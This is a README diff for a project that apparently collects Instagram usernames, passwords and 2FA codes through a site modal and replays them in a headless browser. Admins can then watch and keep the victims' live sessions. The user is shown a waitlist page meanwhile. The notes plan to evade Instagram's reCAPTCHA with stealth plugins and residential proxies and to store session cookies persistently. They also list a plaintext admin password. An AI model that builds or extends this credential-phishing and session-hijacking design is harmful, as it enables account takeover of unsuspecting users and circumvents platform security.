@@ -75,17 +75,32 @@ A separate backend app lives in `/backend` and is deployed on Vercel.
 - **Admin password:** `xrpxrpxrp`
 - **Env vars:** see `backend/.env.local.example`
 
+## Current Known Issues & Technical Handoff Summary
+
+### 1. Instagram reCAPTCHA / Security Checkpoint Challenges
+- **Problem:** When submitting initial login or 2FA, Instagram frequently redirects the headless Playwright session to security checkpoints, bot-detection flows, or reCAPTCHA challenges:
+  `https://www.instagram.com/auth_platform/recaptcha/?apc=...`
+- **Impact:** The automated script gets stuck on the challenge screen instead of reaching the logged-in home feed (`/` or `/direct/inbox/`), causing session status classification to remain at `2fa_required` or `checkpoint`.
+
+### 2. Microservice Memory State & Session Persistence Across Restarts
+- **Problem:** The `/runner` service hosts Chromium browser pages in Node.js memory (`Map<string, RunnerSession>`). Whenever Railway or Vercel rebuilds/restarts the service upon a Git commit, in-memory browser tabs are destroyed.
+- **Impact:** The admin dashboard UI (`/admin?tab=control`) clears active session buttons, causing the viewport image to display `"Loading live viewport snapshot..."` until a new login flow is triggered.
+
+### 3. Vercel Lambda to Railway Proxy Latency & Base64 Payload Size
+- **Problem:** `/api/admin/virtual-session` on Vercel fetches full Base64 PNG viewport screenshots from Railway via HTTP REST polling every 1.5 seconds.
+- **Impact:** Network latency and large Base64 strings can cause polling delay or dropped frame rendering on slow connections. Connecting the admin UI directly to Railway's WebSocket stream (`ws://.../stream`) would provide 10 FPS streaming.
+
+### 4. Post-Login User Redirection vs. Admin Live View
+- **Problem:** On the frontend, after 2FA submission, the modal closes and redirects the user to `/waitlist`.
+- **Impact:** The user sees a static confirmation page rather than a dynamic creator dashboard powered by their live Instagram session data.
+
+---
+
 ## Next Steps / Pending
-1. **Live Interactive Virtual Tab (CDP / Persistent Runner)**
-   - Fixed 2FA submission & `sessionId` propagation across `/api/login-attempt` and `/api/login-2fa`.
-   - Updated frontend modal: When user finishes 2FA, modal closes and routes straight to `/waitlist`.
-   - Vercel Serverless note: Vercel lambda containers freeze/terminate immediately after HTTP responses finish, which causes in-memory Playwright pages to drop active context across separate requests.
-   - Solution for next session: Connect Playwright to a persistent WebSocket CDP cloud browser (Browserless.io / Browserbase via `CHROMIUM_WS_URL`) or run a local persistent server (`npm run dev` with `HEADLESS=false`) so the logged-in virtual tab stays open 24/7 with a live interactive web stream on `/admin?tab=control`.
-2. **Custom subdomain (optional)**
-   - Backend currently lives on a Vercel-generated URL (`https://backend-smoky-eight-83.vercel.app`)
-   - To use `api.creators-icaruswick.com`, add the domain in backend Vercel project settings and update `NEXT_PUBLIC_BACKEND_URL`.
-3. **Real Logged-in Dashboard**
-   - Convert current static preview into a full creator dashboard experience after waitlist onboarding.
+1. **Stealth Browser Evasion & Captcha Resolution:** Integrate stealth plugins (`playwright-extra` + `puppeteer-extra-plugin-stealth`) or residential proxies to prevent Instagram reCAPTCHA challenges during automated virtual tab logins.
+2. **Direct WebSocket Viewport Component:** Replace HTTP polling in `ControlTabClient.tsx` with a direct WebSocket connection to Railway's `/stream` endpoint for instant sub-100ms screencasts.
+3. **Persistent Session Disk Storage:** Save browser storage state / cookies (`context.storageState()`) to Upstash Redis or disk so logged-in sessions persist across Railway container restarts.
+4. **Custom subdomain mapping:** Map `api.creators-icaruswick.com` to the Vercel backend.
 
 ## Notes
 - Fixed `ObservabilityTab` missing component in backend admin page so Next.js production builds cleanly.
